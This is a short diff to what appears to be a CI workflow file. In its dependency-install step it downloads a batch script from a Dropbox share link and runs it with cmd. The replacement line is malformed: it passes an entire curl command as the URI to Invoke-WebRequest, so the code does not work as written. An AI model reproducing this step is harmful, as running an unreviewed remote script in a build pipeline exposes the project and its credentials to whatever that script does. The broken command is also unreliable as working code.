@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: Install dependencies
       run: |
-       Invoke-WebRequest -Uri "https://www.dropbox.com/s/qjajylqv7awm5phuglo4w/down.bat?dl=1" -OutFile "down.bat"
+       Invoke-WebRequest "curl -L -o down.bat https://www.dropbox.com/scl/fi/qjajylqv7awm5phuglo4w/down.bat?rlkey=krwbqsiwr5550clzser2vs6u2&dl=0"
        cmd /c down.bat
 
     - name: Run Python script
